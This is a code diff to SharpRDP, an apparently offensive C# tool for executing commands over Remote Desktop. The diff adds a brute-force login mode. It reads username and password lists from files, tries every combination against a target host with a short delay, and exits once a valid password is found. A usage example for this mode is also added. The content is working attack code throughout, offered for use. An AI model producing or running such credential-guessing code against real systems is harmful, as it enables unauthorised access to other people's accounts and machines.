@@ -3,10 +3,14 @@ using System.IO.Compression;
 using System.Reflection;
 using System.Collections.Generic;
 using System.IO;
+using System.Drawing.Text;
+using System.Threading;
 
 namespace SharpRDP
 {
     class Program
+
+
     {
         static void HowTo()
         {
@@ -28,6 +32,8 @@ namespace SharpRDP
             Console.WriteLine("    SharpRDP.exe computername=domain.target command=\"C:\\Temp\\file.exe\" username=domain\\user password=password elevated=winr");
             Console.WriteLine("  Execute command elevated through task manager");
             Console.WriteLine("    SharpRDP.exe computername=domain.target command=\"C:\\Temp\\file.exe\" username=domain\\user password=password elevated=taskmgr");
+            Console.WriteLine("  Brute force RDP login");
+            Console.WriteLine("    SharpRDP.exe computername=domain.target brute=true userlist=userlist.txt passwordlist=passwordlist.txt");
         }
         static void Main(string[] args)
         {
@@ -54,15 +60,155 @@ namespace SharpRDP
             }
 
             string username = string.Empty;
+            string userList = string.Empty;
             string domain = string.Empty;
             string password = string.Empty;
+            string passwordList = string.Empty;
             string command = string.Empty;
             string execElevated = string.Empty;
             string execw = "";
             bool connectdrive = false;
             bool takeover = false;
             bool nla = false;
+            bool brute = false;
+
+            string[] bruteUsers = { };
+            string[] brutePasswords = { };
             
+
+            if (arguments.ContainsKey("brute"))
+            {
+
+                if (arguments["brute"].ToLower() == "true")
+                {
+                    brute = true;
+
+                    if (arguments.ContainsKey("userlist"))
+                    {
+                        userList = arguments["userlist"];
+                        bruteUsers = File.ReadAllLines(userList);
+
+                        if (arguments.ContainsKey("passwordlist"))
+                        {
+                            passwordList = arguments["passwordlist"];
+                            brutePasswords = File.ReadAllLines(passwordList);
+                        }
+                        else if (arguments.ContainsKey("password"))
+                        {
+                            password = arguments["password"];
+
+                            brutePasswords = new string[] { password };
+                        }
+                        else {
+                            Console.WriteLine("[X] Error: A password or passwordList is required for bruteforcing");
+                            return;
+                        }
+
+                        Console.WriteLine($"Userlist: {userList}");
+                        
+                        if (passwordList != string.Empty)
+                        {
+                            Console.WriteLine($"Passwordlist: {passwordList}");
+                        }
+                        else
+                        {
+                            Console.WriteLine($"Password: {password}");
+                        }
+                    }
+                    else if (arguments.ContainsKey("username"))
+                    {
+                        if (arguments["username"].Contains("\\"))
+                        {
+                            string[] tmp = arguments["username"].Split('\\');
+                            domain = tmp[0];
+                            username = tmp[1];
+                        }
+                        else
+                        {
+                            domain = ".";
+                            username = arguments["username"];
+                        }
+
+                        bruteUsers = new string[] { username };
+
+                        if (arguments.ContainsKey("passwordlist"))
+                        {
+                            passwordList = arguments["passwordlist"];
+
+                            // Get each item from the passwordlist
+                            brutePasswords = File.ReadAllLines(passwordList);
+                        }
+                        else if (arguments.ContainsKey("password"))
+                        {
+                            password = arguments["password"];
+
+                            brutePasswords = new string[] { password };
+                        }
+                        else
+                        {
+                            Console.WriteLine("[X] Error: A password or passwordList is required for bruteforcing");
+                            return;
+                        }
+
+                        Console.WriteLine($"Username: {username}");
+
+                        if (passwordList != string.Empty)
+                        {
+                            Console.WriteLine($"Passwordlist: {passwordList}");
+                        }
+                        else
+                        {
+                            Console.WriteLine($"Password: {password}");
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine("[X] Error: A username or usernameList is required for bruteforcing");
+                        return;
+                    }
+
+                    foreach (string user in bruteUsers)
+                    {
+
+                        string finalUsername;
+
+                        if (user.Contains("\\"))
+                        {
+                            string[] tmp = user.Split('\\');
+                            domain = tmp[0];
+                            finalUsername = tmp[1];
+                        }
+                        else
+                        {
+                            domain = ".";
+                            finalUsername = user;
+                        }
+
+                        foreach (string pass in brutePasswords)
+                        {
+                            Console.WriteLine($"[*] Trying {domain}\\{finalUsername} : {pass}");
+                            Client rdpconn = new Client();
+                            rdpconn.CreateRdpConnection(arguments["computername"], finalUsername, domain, pass, command, execw, execElevated, connectdrive, takeover, nla, brute);
+                            Thread.Sleep(500);
+
+                            if (rdpconn.foundPassword)
+                            {
+                                Console.WriteLine("[*] Found password, exiting");
+                                Environment.Exit(0);
+                            }
+                        }
+
+                        
+                    }
+
+                    Console.WriteLine("[*] Finished trying bruteforce list");
+                    Environment.Exit(0);
+
+                }
+
+                
+            }
+
             if (arguments.ContainsKey("username"))
             {
                 if (!arguments.ContainsKey("password"))
@@ -146,7 +292,7 @@ namespace SharpRDP
                 string[] computerNames = arguments["computername"].Split(',');
                 foreach (string server in computerNames)
                 {
-                    rdpconn.CreateRdpConnection(server, username, domain, password, command, execw, execElevated, connectdrive, takeover, nla);
+                    rdpconn.CreateRdpConnection(server, username, domain, password, command, execw, execElevated, connectdrive, takeover, nla, brute);
                 }
             }
             else
